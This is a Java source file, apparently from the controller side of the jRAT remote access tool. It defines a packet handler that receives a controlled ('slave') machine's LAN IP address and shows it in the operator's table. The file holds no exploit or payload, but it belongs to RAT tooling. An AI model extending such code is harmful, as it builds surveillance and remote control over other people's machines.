package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.ui.frames.Frame;
import io.jrat.client.utils.Utils;

import java.io.DataInputStream;


public class Packet28InitLanAddress extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String raw = slave.readLine();
		slave.setLocalIP(raw);

		int row = Utils.getRow(slave);

		Frame.mainModel.setValueAt(raw, row, 8);
	}

}
